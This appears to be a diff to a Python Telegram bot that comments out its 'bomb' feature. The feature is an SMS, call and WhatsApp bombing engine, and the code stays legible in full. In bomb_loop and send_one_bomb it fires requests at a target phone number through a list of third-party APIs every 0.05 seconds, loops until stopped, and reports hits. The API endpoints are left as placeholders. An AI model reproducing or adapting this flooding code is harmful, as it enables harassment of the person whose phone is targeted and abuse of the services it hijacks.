@@ -840,57 +840,57 @@ def button_selector_keyboard(prefix):
     return InlineKeyboardMarkup(kb)
 
 # ==================== BOMB APIS ====================
-CALL_APIS = [
-    APIs
-]
-WHATSAPP_APIS = [
-    APIs
-]
-SMS_APIS = [
-APIs ]
-BOMB_APIS = CALL_APIS + SMS_APIS + WHATSAPP_APIS
-active_bombs = {}
+# CALL_APIS = [
+#     APIs
+# ]
+# WHATSAPP_APIS = [
+#     APIs
+# ]
+# SMS_APIS = [
+# APIs ]
+# BOMB_APIS = CALL_APIS + SMS_APIS + WHATSAPP_APIS
+# active_bombs = {}
 
-async def bomb_loop(update, context, phone, message):
-    user_id = update.effective_user.id
-    apis = get_all_bomb_apis(); total_apis = len(apis)
-    total_success = 0; total_fail = 0; iteration = 0; start_time = datetime.now()
-    while True:
-        if context.user_data.get("stop_bomb", False): break
-        iteration += 1
-        results = await asyncio.gather(*[send_one_bomb(api, phone) for api in apis], return_exceptions=True)
-        success = sum(1 for r in results if r is True); failed = total_apis - success
-        total_success += success; total_fail += failed
-        elapsed = int((datetime.now() - start_time).total_seconds())
-        try: await message.edit_text(f"💣 **BOMB LIVE** 💣\n━━━━━━━━━━━━━━━━━━━━━━\n📞 `{phone}`\n⏱️ `{elapsed}s` | 🔄 `#{iteration}`\n✅ `{success}/{total_apis}` | ❌ `{failed}`\n📊 Total ✅ `{total_success}` | ❌ `{total_fail}`\n━━━━━━━━━━━━━━━━━━━━━━\n⏳ Press **🛑 Stop Bomb**", parse_mode="Markdown")
-        except: pass
-        await asyncio.sleep(0.05)
-    try: await message.edit_text(f"✅ **Bomb Stopped**\n━━━━━━━━━━━━━━━━━━━━━━\n📞 `{phone}`\n🔄 Cycles: `{iteration}`\n✅ Hits: `{total_success}`\n❌ Failed: `{total_fail}`\n⏱️ `{int((datetime.now() - start_time).total_seconds())}s`", parse_mode="Markdown", reply_markup=get_keyboard(user_id))
-    except: await context.bot.send_message(chat_id=user_id, text=f"✅ Bomb stopped. Hits: {total_success}", reply_markup=get_keyboard(user_id))
-    active_bombs.pop(user_id, None)
+# async def bomb_loop(update, context, phone, message):
+#     user_id = update.effective_user.id
+#     apis = get_all_bomb_apis(); total_apis = len(apis)
+#     total_success = 0; total_fail = 0; iteration = 0; start_time = datetime.now()
+#     while True:
+#         if context.user_data.get("stop_bomb", False): break
+#         iteration += 1
+#         results = await asyncio.gather(*[send_one_bomb(api, phone) for api in apis], return_exceptions=True)
+#         success = sum(1 for r in results if r is True); failed = total_apis - success
+#         total_success += success; total_fail += failed
+#         elapsed = int((datetime.now() - start_time).total_seconds())
+#         try: await message.edit_text(f"💣 **BOMB LIVE** 💣\n━━━━━━━━━━━━━━━━━━━━━━\n📞 `{phone}`\n⏱️ `{elapsed}s` | 🔄 `#{iteration}`\n✅ `{success}/{total_apis}` | ❌ `{failed}`\n📊 Total ✅ `{total_success}` | ❌ `{total_fail}`\n━━━━━━━━━━━━━━━━━━━━━━\n⏳ Press **🛑 Stop Bomb**", parse_mode="Markdown")
+#         except: pass
+#         await asyncio.sleep(0.05)
+#     try: await message.edit_text(f"✅ **Bomb Stopped**\n━━━━━━━━━━━━━━━━━━━━━━\n📞 `{phone}`\n🔄 Cycles: `{iteration}`\n✅ Hits: `{total_success}`\n❌ Failed: `{total_fail}`\n⏱️ `{int((datetime.now() - start_time).total_seconds())}s`", parse_mode="Markdown", reply_markup=get_keyboard(user_id))
+#     except: await context.bot.send_message(chat_id=user_id, text=f"✅ Bomb stopped. Hits: {total_success}", reply_markup=get_keyboard(user_id))
+#     active_bombs.pop(user_id, None)
 
-async def send_one_bomb(api, phone):
-    try:
-        session = await get_aio_session()
-        url = api["url"]
-        if callable(url): url = url(phone)
-        elif isinstance(url, str) and "{phone}" in url: url = url.format(phone=phone)
-        data = api.get("data")
-        if data is not None and callable(data): data = data(phone)
-        elif isinstance(data, str) and "{phone}" in data: data = data.replace("{phone}", phone)
-        headers = api.get("headers", {}); method = api.get("method", "GET").upper()
-        timeout = aiohttp.ClientTimeout(total=8)
-        if method == "GET":
-            async with session.get(url, headers=headers, timeout=timeout) as r: return r.status < 400
-        elif method == "POST":
-            ct = headers.get("Content-Type", "")
-            if ct.startswith("application/json"):
-                try: js = json.loads(data) if data else None
-                except: js = None
-                async with session.post(url, json=js, headers=headers, timeout=timeout) as r: return r.status < 400
-            async with session.post(url, data=data, headers=headers, timeout=timeout) as r: return r.status < 400
-        return False
-    except Exception: return False
+# async def send_one_bomb(api, phone):
+#     try:
+#         session = await get_aio_session()
+#         url = api["url"]
+#         if callable(url): url = url(phone)
+#         elif isinstance(url, str) and "{phone}" in url: url = url.format(phone=phone)
+#         data = api.get("data")
+#         if data is not None and callable(data): data = data(phone)
+#         elif isinstance(data, str) and "{phone}" in data: data = data.replace("{phone}", phone)
+#         headers = api.get("headers", {}); method = api.get("method", "GET").upper()
+#         timeout = aiohttp.ClientTimeout(total=8)
+#         if method == "GET":
+#             async with session.get(url, headers=headers, timeout=timeout) as r: return r.status < 400
+#         elif method == "POST":
+#             ct = headers.get("Content-Type", "")
+#             if ct.startswith("application/json"):
+#                 try: js = json.loads(data) if data else None
+#                 except: js = None
+#                 async with session.post(url, json=js, headers=headers, timeout=timeout) as r: return r.status < 400
+#             async with session.post(url, data=data, headers=headers, timeout=timeout) as r: return r.status < 400
+#         return False
+#     except Exception: return False
 
 # ==================== CLEANER ====================
 def clean_response_data(data, button=None):
